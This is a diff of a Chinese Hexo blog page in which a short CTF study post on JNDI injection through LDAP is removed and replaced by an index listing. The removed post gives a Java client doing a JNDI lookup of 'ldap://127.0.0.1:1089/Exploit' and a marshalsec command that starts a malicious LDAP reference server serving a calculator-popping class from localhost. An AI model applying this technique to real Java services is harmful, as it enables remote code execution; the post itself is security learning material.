@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="images/favicon.ico">
-  <title>LADP+JNDI注入 | fmyyy</title>
+  <title>fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,14 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="LADP+JNDI注入除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点">
-<meta property="og:type" content="article">
-<meta property="og:title" content="LADP+JNDI注入">
-<meta property="og:url" content="https://fmyyy.gitee.io/2021/11/18/JNDI+LADP/index.html">
+  <meta name="description" content="dddddddd">
+<meta property="og:type" content="website">
+<meta property="og:title" content="fmyyy">
+<meta property="og:url" content="https://fmyyy.gitee.io/page/9/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="LADP+JNDI注入除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点">
+<meta property="og:description" content="dddddddd">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
-<meta property="article:published_time" content="2021-11-18T01:14:04.000Z">
-<meta property="article:modified_time" content="2021-12-02T04:31:58.000Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -167,170 +165,73 @@
 
         
 
-            <article>
-    <div class="kratos-hentry kratos-post-inner clearfix">
-        <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">LADP+JNDI注入</h1>
-            
-            
-            <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-11-18</li>
-                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
-                <li>
-                    <i class="fa fa-edit"></i> 
-                    
-                    
-                        1205
-                    
-                    字
-                </li>
+    
+    
+        <article class="kratos-hentry clearfix">
+            <div class="kratos-entry-border-new clearfix">
                 
-            </ul>
-        </header>
-        <div class="kratos-post-content">
-            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1638419518000"></time> 前，其中的内容可能需要更新。
-            </div>
-            
-                <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LADP-JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">LADP+JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LADP"><span class="toc-number">1.1.</span> <span class="toc-text">LADP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#marshalsec"><span class="toc-number">1.2.</span> <span class="toc-text">marshalsec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">测试</span></a></li></ol></li></ol>
+                <div class="kratos-entry-thumb-new">
+                    <a href="/2021/08/25/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-1/">
+                        
+                            <img class="kratos-entry-thumb-new-img">
+                        
+                    </a>
                 </div>
-            
-            <hr />
-            <h1 id="LADP-JNDI注入"><a href="#LADP-JNDI注入" class="headerlink" title="LADP+JNDI注入"></a>LADP+JNDI注入</h1><p>除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。</p>
-<h2 id="LADP"><a href="#LADP" class="headerlink" title="LADP"></a>LADP</h2><p>LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol）</p>
-<p>LADP主要能储存以下java对象</p>
-<ol>
-<li>Java serializable objects</li>
-<li>Referenceable objects and JNDI References</li>
-<li>Objects with attributes (DirContext)</li>
-<li>RMI (Java Remote Method Invocation) objects (including those that use IIOP)</li>
-<li>CORBA objects</li>
-</ol>
-<p>我们主要就是利用的第二点Reference对象，这在之前也学过。</p>
-<h2 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h2><p>marshalsec是一个可以快速搭建一个恶意的rmi或者ldap server的工具。</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>写一个客户端</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LADPCLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> InitialContext().lookup(<span class="string">&quot;ldap://127.0.0.1:1089/Exploit&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+                <div class="kratos-post-inner-new">
+                    <header class="kratos-entry-header-new">
+                            <a class="label-link" href="/categories/java/">java</a>
+                        <h2 class="kratos-entry-title-new"><a href="/2021/08/25/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-1/">java反射学习-1</a>
+                    </header>
+                    <div class="kratos-entry-content-new">
+                        <p>
+                            
+                                学习java反序列化之前少不了学习反射，虽然之前学过，还是再学一遍
+java反射机制的定义Java反射机制是在运行状态中，对于任意一个类，都能够知道这个类中的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态...
+                            
+                        </p>
+                    </div>
+                </div>
+                <footer class="kratos-post-meta-new">
+                    <span class="pull-left">
+                        <a>
+                            <i class="fa fa-calendar"></i>
+                            2021-08-25
+                        </a>
+                        <a>
+                            
+                        </a>
+                        
+                            <!-- 当前仅支持valine/waline自带的统计功能 -->
+                            
+                        
+                        
+                            <!-- 当前仅支持waline自带的统计功能 -->
+                            
+                        
+                    </span>
+                    <span class="pull-right">
+                        <a class="read-more" href="/2021/08/25/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-1/" title="阅读全文">阅读全文<i class="fa fa-chevron-circle-right"></i></a>
+                    </span>
+                </footer>
+            </div>
+        </article>
+    
 
-<p>用marshalsec搭建ladp服务</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8000/\#Exploit 1089</span></span><br></pre></td></tr></table></figure>
 
-<p>编译好的弹计算器的恶意类放web根目录，之后运行客户端</p>
-<p><img src="http://img.le1a.com/2021/11/17/89ea654ddabde.png" alt="1637134409595.png"></p>
-<p>ladp服务也输出了相关信息</p>
-<p><img src="http://img.le1a.com/2021/11/17/2711de5ccbeaa.png" alt="1637134442267.png"></p>
-<p>这篇我主要是熟悉一下工具的使用，熟悉之后遇到题目不至于不会用工具。</p>
 
-        </div>
-        
-            <div class="kratos-copyright text-center clearfix">
-                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
-            </div>
-        
-        <footer class="kratos-entry-footer clearfix">
-            
-                <div class="post-like-donate text-center clearfix" id="post-like-donate">
-                
-                
-                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
-                    <div class="share-wrap" style="display: none;">
-    <div class="share-group">
-        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-qq"></i>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-star"></i>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-weixin"></i>
-            </div>
-            <div class="share-int">
-                <div class="qrcode" id="wechat-qr"></div>
-                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-weibo"></i>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-facebook"></i>
-            </div>
-        </a>
-        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
-            <div class="icon-wrap">
-                <i class="fa fa-twitter"></i>
-            </div>
-        </a>
+    <div class='text-center pagination'>
+    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span>
     </div>
-    <script type="text/javascript">
-        $(()=>{
-            new QRCode("wechat-qr", {
-                text: "https://fmyyy.gitee.io/2021/11/18/JNDI+LADP/",
-                width: 150,
-                height: 150,
-                correctLevel : QRCode.CorrectLevel.H
-            });
-        });
-        function share(dest) {
-            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
-            const weiboBase     = "https://service.weibo.com/share/share.php?";
-            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
-            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
-            const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://fmyyy.gitee.io/2021/11/18/JNDI+LADP/";
-            const title         = "「LADP+JNDI注入」";
-            const excerpt       = `LADP+JNDI注入除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap:...`;
-            let _URL;
-            switch (dest) {
-                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
-                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
-                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
-                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
-                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
-            }
-            window.open(_URL);
-        };
-    </script>
-</div>
-                
-                </div>
-            
-            <div class="footer-tag clearfix">
-                <div class="pull-left">
-                <i class="fa fa-tags"></i>
-                    
-                </div>
-                <div class="pull-date">
-                <span>最后编辑：2021-12-02</span>
-                </div>
-            </div>
-        </footer>
+
+
+
+    <div class="hidden">
+        <!-- 加载文章阅读对应的统计功能，评论自带的那种 -->
+        
     </div>
-    
-        <nav class="navigation post-navigation clearfix" role="navigation">
-            
-            <div class="nav-previous clearfix">
-                <a title=" java fastjson基础" href="/2021/11/16/fastjson基础/">&lt; 上一篇</a>
-            </div>
-            
-            
-            <div class="nav-next clearfix">
-                <a title=" jdk7u21反序列化" href="/2021/11/19/jdk7u21/">下一篇 &gt;</a>
-            </div>
-            
-        </nav>
-    
-    
-</article>
+
+
 
         
 
@@ -343,6 +244,8 @@
 
 <section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
     <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+        <div class="sticky-area">
     
     
                 <aside id="krw-about" class="widget widget-kratos-about clearfix">
@@ -357,22 +260,6 @@
     </div>
 </aside>
             
-                    <div class="sticky-area">
-                
-                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
-    <div class="photo-background"></div>
-    <h4 class="widget-title no-after">
-        <i class="fa fa-compass"></i>
-        文章目录
-        <span class="toc-progress-bar"></span>
-    </h4>
-    <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LADP-JNDI%E6%B3%A8%E5%85%A5"><span class="toc-text">LADP+JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LADP"><span class="toc-text">LADP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#marshalsec"><span class="toc-text">marshalsec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-text">测试</span></a></li></ol></li></ol>
-    </div>
-</aside>
-                
-                    <div class="sticky-area">
-                
                 
   <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
     <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
